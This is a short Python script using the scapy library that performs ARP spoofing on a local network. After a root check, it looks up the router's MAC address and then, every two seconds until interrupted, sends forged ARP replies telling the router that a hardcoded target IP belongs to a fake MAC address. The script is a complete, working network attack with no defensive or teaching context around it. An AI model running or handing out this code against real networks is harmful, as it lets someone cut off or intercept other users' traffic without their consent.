import os
import scapy.all as scapy
import time


# Check for root privileges
if not os.geteuid() == 0:
  exit("This script requires root privileges. Run it again with sudo.")


def get_mac(ip):
  arp_request = scapy.ARP(pdst=ip)
  broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
  arp_request_broadcast = broadcast / arp_request
  answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
  return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip, fake_mac):
  router_mac = get_mac(spoof_ip)
  packet = scapy.ARP(op=2, pdst=spoof_ip, hwdst=router_mac,
                     psrc=target_ip, hwsrc=fake_mac)
  scapy.send(packet, verbose=False)


fake_mac = "de:ad:be:ef:de:ad"  # Fake MAC address
target_ip = "192.168.0.17"  # IP of the target machine
gateway_ip = "192.168.0.1"  # IP of the router

try:
  while True:
    spoof(target_ip, gateway_ip, fake_mac)
    time.sleep(2)  # Add delay to avoid flooding the network
except KeyboardInterrupt:
  print("\nARP spoofing stopped.")
